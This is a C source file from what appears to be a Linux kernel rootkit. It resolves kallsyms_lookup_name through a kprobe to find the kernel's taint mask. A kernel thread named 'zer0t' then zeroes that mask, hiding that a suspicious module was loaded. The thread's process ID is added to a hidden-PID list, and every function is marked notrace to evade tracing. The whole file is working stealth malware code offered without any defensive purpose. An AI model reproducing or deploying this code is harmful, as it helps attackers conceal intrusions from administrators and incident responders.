#include "../include/core.h"
#include "../include/reset_tainted.h"
#include "../include/hidden_pids.h"

#define RESET_THREAD_NAME "zer0t"

static struct task_struct *cleaner_thread = NULL;
static unsigned long *taint_mask_ptr = NULL;

static struct kprobe probe_lookup = {
    .symbol_name = "kallsyms_lookup_name"
};

static notrace unsigned long *get_taint_mask_address(void) {
    typedef unsigned long (*lookup_name_fn)(const char *name);
    lookup_name_fn kallsyms_lookup_fn;
    unsigned long *taint_addr = NULL;

    if (register_kprobe(&probe_lookup) < 0)
        return NULL;

    kallsyms_lookup_fn = (lookup_name_fn) probe_lookup.addr;
    unregister_kprobe(&probe_lookup);

    if (kallsyms_lookup_fn)
        taint_addr = (unsigned long *)kallsyms_lookup_fn("tainted_mask");

    return taint_addr;
}

static notrace void reset_taint_mask(void) {
    if (taint_mask_ptr && *taint_mask_ptr != 0)
        *taint_mask_ptr = 0;
}

static notrace int zt_thread(void *data) {
    reset_taint_mask();
    return 0;
}

notrace int reset_tainted_init(void) {
    taint_mask_ptr = get_taint_mask_address();
    if (!taint_mask_ptr)
        return -EFAULT;

    cleaner_thread = kthread_run(zt_thread, NULL, RESET_THREAD_NAME);
    if (IS_ERR(cleaner_thread))
        return PTR_ERR(cleaner_thread);

    add_hidden_pid(cleaner_thread->pid);

    return 0;
}

notrace void reset_tainted_exit(void) {
    if (cleaner_thread)
        kthread_stop(cleaner_thread);
}
